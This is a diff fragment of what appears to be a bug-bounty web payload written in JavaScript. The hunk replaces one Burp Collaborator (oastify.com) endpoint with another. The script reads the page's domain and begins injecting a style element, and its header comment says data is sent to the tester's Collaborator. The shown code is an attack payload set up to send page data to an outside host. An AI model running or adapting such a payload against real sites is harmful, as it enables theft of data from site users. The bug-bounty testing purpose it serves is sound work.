@@ -3,7 +3,7 @@
    sent to the tester's Burp Collaborator. For a bug-bounty writeup only. */
 (function () {
   var d = document, O = d.domain;
-  var C = 'https://ck0x6egwe34xd0nn6rxtbzokebk88x.oastify.com/';   // <-- your Collaborator
+  var C = 'https://6jqhwcf3sic62e48sgyqx1z7hynpbtzi.oastify.com/';   // <-- your Collaborator
 
   var css = d.createElement('style');
   css.textContent =
